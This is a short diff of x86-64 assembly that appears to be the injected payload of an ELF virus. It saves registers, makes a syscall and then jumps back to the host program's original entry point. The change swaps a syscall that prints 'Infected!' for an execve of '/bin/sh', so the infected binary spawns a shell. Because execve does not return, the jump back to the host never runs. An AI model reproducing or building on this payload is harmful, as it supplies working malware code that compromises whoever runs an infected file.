@@ -16,21 +16,20 @@ section .text
 
 shellcode:
     push rax
-    push rcx
     push rdx
     push rsi
     push rdi
 
-    mov rax, 1              
-    mov rdi, 1              
-    lea rsi, [rel msg]      
-    mov rdx, 9              
-    syscall
+    ; /bin/sh
+    mov rax, 59
+    lea rdi, [rel sh_path]
+    xor rsi, rsi
+    xor rdx, rdx
+    syscall   
 
     pop rdi
     pop rsi
     pop rdx
-    pop rcx
     pop rax
 
     ; Calcul de l'adresse de base (pour PIE)
@@ -44,7 +43,7 @@ get_base:
     add rax, [rel entry_offset]
     jmp rax                
 
-msg db "Infected!", 0xa, 0
+sh_path db "/bin/sh", 0
 entry_offset dq 0x1060     
 shellcode_end:
     shellcode_len equ shellcode_end - shellcode
